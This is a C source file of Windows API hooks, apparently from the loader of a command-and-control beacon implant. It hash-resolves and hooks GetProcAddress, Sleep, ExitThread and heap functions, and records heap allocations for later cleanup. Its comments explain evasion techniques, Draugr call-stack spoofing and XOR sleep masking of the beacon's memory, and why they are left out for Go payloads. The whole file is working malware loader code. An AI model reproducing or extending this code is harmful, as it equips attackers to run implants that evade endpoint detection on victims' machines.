#include <windows.h>
#include "memory.h"
#include "mask.h"
#include "spoof.h"
#include "cleanup.h"
#include "tcg.h"

MEMORY_LAYOUT g_memory;

DECLSPEC_IMPORT VOID   WINAPI KERNEL32$Sleep       ( DWORD );
DECLSPEC_IMPORT VOID   WINAPI KERNEL32$ExitThread  ( DWORD );
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc   ( HANDLE, DWORD, SIZE_T );
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$HeapFree    ( HANDLE, DWORD, LPVOID );
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapReAlloc ( HANDLE, DWORD, LPVOID, SIZE_T );

FARPROC WINAPI _GetProcAddress ( HMODULE hModule, LPCSTR lpProcName )
{
    /* lpProcName may be an ordinal */
    if ( ( ULONG_PTR ) lpProcName >> 16 == 0 )
    {
        /* just resolve normally */
        return GetProcAddress ( hModule, lpProcName );
    }

    FARPROC result = __resolve_hook ( ror13hash ( lpProcName ) );

    /*
     * result may still be NULL if 
     * it wasn't hooked in the spec
     */
    if ( result != NULL ) {
        return result;
    }
    
    return GetProcAddress ( hModule, lpProcName );
}

void setup_hooks ( IMPORTFUNCS * funcs )
{
    funcs->GetProcAddress = ( __typeof__ ( GetProcAddress ) * ) _GetProcAddress;
}

void setup_memory ( MEMORY_LAYOUT * layout )
{
    if ( layout != NULL ) {
        g_memory = * layout;
    }
}

/* 
 * throw these hooks in here because
 * sharing a global across multiple
 * modules is still a bit of a headache
 */

VOID WINAPI _Sleep ( DWORD dwMilliseconds )
{
    /*
     * Do NOT use spoof_call / Draugr here.
     *
     * Draugr holds a fake BaseThreadInitThunk/RtlUserThreadStart call stack on
     * the OS thread for the full sleep duration.  Go's sysmon goroutine fires
     * its async preemptor (via SuspendThread + SetThreadContext injection) every
     * ~10 ms.  Each injection sees the fake stack, corrupts the goroutine's
     * g.sched.sp save area, and after sleep returns the next memmove reads a
     * ~1-billion-byte count from the corrupted goroutine struct → crash.
     *
     * XOR sleep mask is also omitted: masking beacon DLL sections in-place
     * while Go goroutines on other OS threads keep executing would cause those
     * threads to run XOR-scrambled code.
     */
    KERNEL32$Sleep ( dwMilliseconds );
}

VOID WINAPI _ExitThread ( DWORD dwExitCode )
{
    /*
     * cleanup_memory omitted: freeing dll_dst while other goroutines are
     * still running it causes use-after-free (Go's init thread calls
     * ExitThread before the beacon goroutine finishes).
     *
     * spoof_call / Draugr omitted: same Go async preemption hazard as the
     * other hooks — see hooks.c for details.  ExitThread doesn't return, so
     * the OS reclaims all memory on process exit anyway.
     */
    KERNEL32$ExitThread ( dwExitCode );
}

LPVOID WINAPI _HeapAlloc ( HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes )
{
    LPVOID result = KERNEL32$HeapAlloc ( hHeap, dwFlags, dwBytes );

    /* store a record of this heap allocation */
    if ( dwBytes >= 256 && result != NULL && g_memory.Heap.Count < MAX_HEAP_RECORDS )
    {
        g_memory.Heap.Records [ g_memory.Heap.Count ].Address = result;
        g_memory.Heap.Records [ g_memory.Heap.Count ].Size    = dwBytes;
        g_memory.Heap.Count++;
    }

    return result;
}

LPVOID WINAPI _HeapReAlloc ( HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T dwBytes )
{
    LPVOID result = KERNEL32$HeapReAlloc ( hHeap, dwFlags, lpMem, dwBytes );

    if ( result )
    {
        BOOL found = FALSE;

        for ( int i = 0; i < g_memory.Heap.Count; i++ )
        {
            if ( g_memory.Heap.Records [ i ].Address == lpMem )
            {
                g_memory.Heap.Records [ i ].Address = result;
                g_memory.Heap.Records [ i ].Size    = dwBytes;
                found = TRUE;
                break;
            }
        }

        if ( !found && dwBytes >= 256 && g_memory.Heap.Count < MAX_HEAP_RECORDS )
        {
            g_memory.Heap.Records [ g_memory.Heap.Count ].Address = result;
            g_memory.Heap.Records [ g_memory.Heap.Count ].Size    = dwBytes;
            g_memory.Heap.Count++;
        }
    }

    return result;
}


BOOL WINAPI _HeapFree ( HANDLE hHeap, DWORD dwFlags, LPVOID lpMem )
{
    BOOL result = KERNEL32$HeapFree ( hHeap, dwFlags, lpMem );

    if ( result )
    {
        /* remove the right heap record */

        for ( int i = 0; i < g_memory.Heap.Count; i++ )
        {
            if ( g_memory.Heap.Records [ i ].Address == lpMem )
            {
                int last = g_memory.Heap.Count - 1;
                g_memory.Heap.Records [ i ] = g_memory.Heap.Records [ last ];
                g_memory.Heap.Records [ last ].Address = NULL;
                g_memory.Heap.Records [ last ].Size    = 0;
                g_memory.Heap.Count--;
                break;
            }
        }
    }

    return result;
}